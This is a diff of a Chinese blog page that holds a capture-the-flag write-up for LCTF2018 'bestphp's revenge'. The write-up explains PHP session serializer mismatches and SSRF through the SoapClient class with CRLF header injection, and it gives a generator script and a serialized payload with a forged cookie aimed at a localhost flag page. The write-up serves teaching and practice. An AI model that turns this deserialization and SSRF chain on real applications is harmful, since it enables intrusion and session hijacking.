@@ -16,12 +16,12 @@
   <meta name="author" content="orange">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前言:今天在学习php的原生类的时候看到的题，学习一下吧。 题目在线靶场 题目源码 123456789101112 &lt;?phphighlight_file(__FILE__);$b &#x3D; &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&#x27;n">
+    <meta name="description" content="前言:今天在学习php的原生类的时候看到的题，学习一下吧。  题目 在线靶场 题目源码 123456789101112 &lt;?phphighlight_file(__FILE__);$b &#x3D; &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&amp;#x27">
 <meta property="og:type" content="article">
 <meta property="og:title" content="LCTF2018-bestphp&#39;s revenge">
 <meta property="og:url" content="https://0ran9ewww.github.io/2024/10/27/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/LCTF2018-bestphp's%20revenge/index.html">
 <meta property="og:site_name" content="0raN9e的笔记">
-<meta property="og:description" content="前言:今天在学习php的原生类的时候看到的题，学习一下吧。 题目在线靶场 题目源码 123456789101112 &lt;?phphighlight_file(__FILE__);$b &#x3D; &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&#x27;n">
+<meta property="og:description" content="前言:今天在学习php的原生类的时候看到的题，学习一下吧。  题目 在线靶场 题目源码 123456789101112 &lt;?phphighlight_file(__FILE__);$b &#x3D; &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&amp;#x27">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/back2.png">
 <meta property="article:published_time" content="2024-10-27T11:00:00.000Z">
@@ -115,7 +115,11 @@
 
 
   
-<meta name="generator" content="Hexo 7.1.1"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
 
 
 <body>
@@ -265,7 +269,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          836 字
+          831 字
         
       </span>
     
@@ -335,49 +339,46 @@
               <div class="markdown-body">
                 
                 <p>前言:今天在学习php的原生类的时候看到的题，学习一下吧。</p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/34">在线靶场</a></p>
+<h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2>
+<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/34">在线靶场</a></p>
 <p>题目源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;implode&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>], <span class="hljs-variable">$_POST</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>) &#123; &#125; <br></code></pre></td></tr></table></figure>
-
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><p>把第一个参数作为回调函数调用</p>
-<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p>先看一下3种不同的 session 序列化处理器处理 session 的情况。先看案例代码</p>
+<h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2>
+<h3 id="call_user_func"><a class="markdownIt-Anchor" href="#call_user_func"></a> call_user_func()</h3>
+<p>把第一个参数作为回调函数调用</p>
+<h3 id="session反序列化"><a class="markdownIt-Anchor" href="#session反序列化"></a> session反序列化</h3>
+<p>先看一下3种不同的 session 序列化处理器处理 session 的情况。先看案例代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;orange&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>当 session.serialize_handler&#x3D;php 时，session文件内容为： <code>name|s:6:&quot;orange&quot;;</code></p>
-<p>当 session.serialize_handler&#x3D;php_serialize 时，session文件为：<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;orange&quot;;&#125;</code></p>
-<p>当 session.serialize_handler&#x3D;php_binary 时，session文件内容为： 二进制字符<code>names:6:&quot;orange&quot;;</code></p>
+<p>当 session.serialize_handler=php 时，session文件内容为： <code>name|s:6:&quot;orange&quot;;</code></p>
+<p>当 session.serialize_handler=php_serialize 时，session文件为：<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;orange&quot;;&#125;</code></p>
+<p>当 session.serialize_handler=php_binary 时，session文件内容为： 二进制字符<code>names:6:&quot;orange&quot;;</code></p>
 <p>当<code>session</code>反序列化和序列化时候使用不同引擎的时候,可以触发漏洞</p>
 <p>php引擎会以<code>|</code>作为<code>key</code>和<code>value</code>的分隔符,传入内容时，如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;|username&#x27;</span><br></code></pre></td></tr></table></figure>
-
 <p>在使用php_serialize引擎时可以得到序列化内容</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;|username&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
-
 <p>然后在进行反序列化的时候|被当做分隔符，于是</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
-
 <p>这部分会被当做key，然后后面的部分即<code>username</code>会被当做value</p>
-<p>因此传入<code>$_SESSION[&#39;name&#39;] = |序列化内容</code>这样的形式可以构造漏洞</p>
-<h3 id="PHP原生类SoapClient"><a href="#PHP原生类SoapClient" class="headerlink" title="PHP原生类SoapClient"></a>PHP原生类SoapClient</h3><p>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。</p>
+<p>因此传入<code>$_SESSION['name'] = |序列化内容</code>这样的形式可以构造漏洞</p>
+<h3 id="php原生类soapclient"><a class="markdownIt-Anchor" href="#php原生类soapclient"></a> PHP原生类SoapClient</h3>
+<p>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。</p>
 <p>可以调用其不存在的方法来触发<code>__call</code>魔术</p>
 <p>通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容</p>
 <p>由于其内置类有<code>__call</code>方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中（结合CRLF注入</p>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>存在<code>session</code>反序列化的漏洞，取session的第一项与<code>welcome_to_the_lctf2018</code>构成数组，进行implode函数拼接</p>
+<h2 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h2>
+<p>存在<code>session</code>反序列化的漏洞，取session的第一项与<code>welcome_to_the_lctf2018</code>构成数组，进行implode函数拼接</p>
 <p>在<code>/flag</code>下有内容</p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">only localhost can get flag!session<span class="hljs-emphasis">_start(); echo &#x27;only localhost can get flag!&#x27;; $flag = &#x27;LCTF&#123;<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>&#125;&#x27;;</span><br><span class="hljs-emphasis">if($\_</span>SERVER[&quot;REMOTE<span class="hljs-emphasis">_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123; $\_</span>SESSION[&#x27;flag&#x27;] = $flag; &#125;<br>only localhost can get flag! <br></code></pre></td></tr></table></figure>
-
 <p>说明需要我们对<code>ip</code>进行伪造</p>
 <p>思路大体是利用<code>SoapClient</code>类构造出ssrf的序列化字符串，然后利用<code>call_user_func</code>修改配置，造成序列化与反序列化引擎不同的漏洞，再调用<code>extract</code>函数去变量覆盖，调用SoapClient类，从而触发<code>__call</code> 方法</p>
 <p>(需要自行在php.ini里把内置类启用)</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<br>    <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;orange\r\nCookie:PHPSESSID=123456&quot;</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;orange&#x27;</span>,<br>        <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span><br>    )<br>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure>
-
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A6%3A%22orange%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22<span class="hljs-emphasis">_stream_</span>context%22%3Bi%3A0%3Bs%3A11%3A%22<span class="hljs-emphasis">_user_</span>agent%22%3Bs%3A31%3A%22orange%0D%0ACookie%3APHPSESSID%3D123456%22%3Bs%3A13%3A%22<span class="hljs-emphasis">_soap_</span>version%22%3Bi%3A1%3B%7D<br></code></pre></td></tr></table></figure>
-
 <p>给f传入<code>session_start</code>，post传入<code>serialize_handler=serialize</code>更改session序列化时候的引擎</p>
 <p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-10-27204433.png" srcset="/img/loading.gif" lazyload alt="2024-10-27204433"></p>
 <p>实现session伪造，然后调用extract函数变量覆盖题目的implode函数，使得再次调用call_user_func函数，构造出下面命令</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;SoapClient&quot;</span>,<span class="hljs-string">&quot;welcome_to_the_lctf2018&quot;</span>))<br></code></pre></td></tr></table></figure>
-
 <p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-10-27204523.png" srcset="/img/loading.gif" lazyload alt="2024-10-27204523"></p>
 <p>最后回到index.php里面，改一下cookie</p>
 <p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-10-27204556.png" srcset="/img/loading.gif" lazyload alt="2024-10-27204556"></p>
@@ -789,6 +790,22 @@
   <noscript>
     <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
   </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>Copy
 </body>
 </html>
 
